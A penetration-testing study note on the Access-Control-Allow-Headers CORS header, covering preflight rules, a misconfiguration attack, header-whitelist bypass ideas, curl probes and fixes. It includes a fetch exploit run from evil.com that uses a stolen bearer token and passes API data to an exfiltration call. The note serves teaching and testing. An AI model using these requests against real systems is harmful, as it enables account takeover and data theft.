---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.44 Access-Control-Allow-Headers — CORS Header Whitelist"
---

# 03.44 — Access-Control-Allow-Headers

## What is it?

`Access-Control-Allow-Headers` specifies which request headers are allowed in cross-origin requests (CORS). Non-simple headers (like `Authorization`, `X-Custom-Header`) require preflight. If the server allows them, attacker pages can send authenticated cross-origin requests.

---

## Simple vs Non-Simple Headers

```
SIMPLE HEADERS (no preflight needed):
  Accept, Accept-Language, Content-Language
  Content-Type: application/x-www-form-urlencoded
  Content-Type: multipart/form-data  
  Content-Type: text/plain

NON-SIMPLE HEADERS (trigger preflight):
  Authorization
  Content-Type: application/json
  X-Custom-Header
  X-API-Key
  Any other non-standard header
```

---

## Attack: Allowing Authorization Cross-Origin

```
PREFLIGHT RESPONSE:
  Access-Control-Allow-Origin: https://evil.com
  Access-Control-Allow-Headers: Authorization, Content-Type
  Access-Control-Allow-Credentials: true

EXPLOIT from evil.com:
  fetch('https://target.com/api/admin', {
    headers: {
      'Authorization': 'Bearer ' + stolenToken,
      'Content-Type': 'application/json'
    },
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => exfilData(data))
  
  → Authorization header allowed cross-origin!
  → If attacker has stolen token → full API access!
```

---

## CORS Header Whitelist Bypass

```
IF only specific custom headers are whitelisted:
  Access-Control-Allow-Headers: X-Custom-API-Key
  (but not Authorization)

BYPASS: Use a different header that bypasses WAF/auth checks:
  Try non-standard auth headers:
  X-Custom-API-Key: stolen_value
  → Already in whitelist!

OR: Use a header name that auth system reads differently:
  Authorization vs Proxy-Authorization vs X-Authorization
  → Test all variants
```

---

## Testing

```bash
# Test which headers are allowed:
curl -X OPTIONS https://target.com/api \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization, X-Custom-Header" \
  -sI | grep -i "allow-headers"

# Test wildcard headers:
curl -X OPTIONS https://target.com/api \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Headers: Evil-Header" \
  -sI | grep -i "allow-headers"
# If "Evil-Header" appears in response → wildcard headers!
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Authorization allowed in CORS | Only allow Authorization if ACAO is restricted |
| Wildcard header allowance | Explicitly list required headers only |
| Reflecting request headers | Use static allowlist |

---

## Related Notes
- [[41 - Access-Control-Allow-Origin]] — ACAO header
- [[43 - Access-Control-Allow-Methods]] — methods allowlist
- [[Module 08 - CORS]] — full CORS exploitation
